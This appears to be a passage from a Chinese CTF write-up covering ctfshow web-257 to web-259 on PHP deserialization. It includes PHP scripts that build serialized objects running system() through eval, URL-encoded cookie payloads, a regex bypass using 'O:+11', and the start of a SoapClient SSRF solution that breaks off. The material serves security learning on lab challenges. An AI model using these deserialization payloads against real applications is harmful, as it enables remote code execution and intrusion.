class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;a&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;b&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;a&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>a&amp;password<span class="hljs-operator">=</span>b<br><br>Cookie：user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">21</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>ctfShowUser<span class="hljs-variable">%00</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">21</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>ctfShowUser<span class="hljs-variable">%00</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>b<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">18</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>ctfShowUser<span class="hljs-variable">%00</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">18</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>ctfShowUser<span class="hljs-variable">%00</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">14</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>backDoor<span class="hljs-variable">%00</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">23</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>tac+flag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png"></p><hr><h2 id="web-258-php反序列化-oc-d-i正则绕过"><a href="#web-258-php反序列化-oc-d-i正则绕过" class="headerlink" title="web-258 php反序列化&#x2F;&#96;[oc]:\d+:&#x2F;i正则绕过"></a>web-258 php反序列化&#x2F;&#96;[oc]:\d+:&#x2F;i正则绕过</h2><p>先看题目</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="language-php"># -*- coding: utf-8 -*-</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Author</span>: h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span></span><br><span class="hljs-comment"><span class="language-php"></span></span><br><span class="hljs-comment"><span class="language-php">*/</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="language-php">        <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);</span><br><span class="language-php">&#125;</span><br></code></pre></td></tr></table></figure><p>这题和上题差不多，就是多了个正则匹配</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">/`<span class="hljs-selector-attr">[oc]</span>:\d+:/i意思就是不能出现O:数字，我们用<span class="hljs-number">0</span>:+数字即可绕过。<br>` <span class="hljs-selector-attr">[oc]</span>: 就是正则匹配的意思 \d: 匹配一个数字字符。等价于 <span class="hljs-selector-attr">[0-9]</span>。<br>+: 匹配前面的子表达式一次或多次。<br>例如，<span class="hljs-string">&#x27;zo+&#x27;</span> 能匹配 <span class="hljs-string">&quot;zo&quot;</span> 以及 <span class="hljs-string">&quot;zoo&quot;</span>，但不能匹配 <span class="hljs-string">&quot;z&quot;</span>。+ 等价于 &#123;<span class="hljs-number">1</span>,&#125;。<br>/<span class="hljs-selector-tag">i</span>: 表示匹配的时候不区分大小写<br></code></pre></td></tr></table></figure><p>所以可以构造</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;</span><br><span class="language-php"> </span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后会输出O:11:”ctfShowUser”:4:{s:8:”username”;s:6:”xxxxxx”;s:8:”password”;s:6:”xxxxxx”;s:5:”isVip”;b:0;s:5:”class”;O:8:”backDoor”:1:{s:4:”code”;s:17:”system(‘tac f*’);”;}}</p><p>然后我们修饰一下，使用0:+数字绕过</p><p>O:+11:”ctfShowUser”:4:{s:8:”username”;s:6:”xxxxxx”;s:8:”password”;s:6:”xxxxxx”;s:5:”isVip”;b:0;s:5:”class”;O:+8:”backDoor”:1:{s:4:”code”;s:17:”system(‘tac f*’);”;}}</p><p>然后再进行url编码</p><p>O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system(‘tac%20f*’)%3B%22%3B%7D%7D</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br><br>Cookie：user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>class<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>B<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>backDoor<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">17</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>system(&#x27;tac<span class="hljs-variable">%20</span>f*&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png"></p><hr><h2 id="web-259-原生类SoapClient"><a href="#web-259-原生类SoapClient" class="headerlink" title="web-259 原生类SoapClient"></a>web-259 原生类SoapClient</h2><p>先看题目</p><p>提示：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">flag.php<br><br><span class="hljs-variable">$xff</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>array_pop(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = array_pop(<span class="hljs-variable">$xff</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>file_put_contents(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$vip</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br><span class="hljs-comment">//vip can get flag one key</span><br><span class="hljs-variable">$vip</span>-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br><br><br><br><br><br>Notice: Undefined index: vip in /<span class="hljs-keyword">var</span>/www/html/index.php on line <span class="hljs-number">6</span><br><br>Fatal error: Uncaught <span class="hljs-built_in">Error</span>: Call to a member <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>) <span class="hljs-title">on</span> <span class="hljs-title">bool</span> <span class="hljs-title">in</span> /<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">index</span>.<span class="hljs-title">php</span>:8 <span class="hljs-title">Stack</span> <span class="hljs-title">trace</span>: #0 </span>&#123;main&#125; thrown in /<span class="hljs-keyword">var</span>/www/html/index.php on line <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>首先看一下题解的方法，说是用到了php的原生类 SoapClient ，好像还跟ssrf有关系</p><p>具体思路就是通过访问flag.php并且绕过其中的过滤，让服务器把flag.txt放出来，然后访问</p><p>&#x2F;&#x2F; dirsearch 目录扫描发现 flag.php</p><p>&#x2F;&#x2F; 访问测试后发现需要本地访问</p><p>&#x2F;&#x2F; 反序列化之后调用 getFlag() 方法</p><p>&#x2F;&#x2F; 没有 getFlag() 方法则会调用 __call() 方法</p><p>这里考php的原生类SoapClient <a href="https://www.php.net/manual/en/class.soapclient.php">https://www.php.net/manual/en/class.soapclient.php</a></p><p>这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 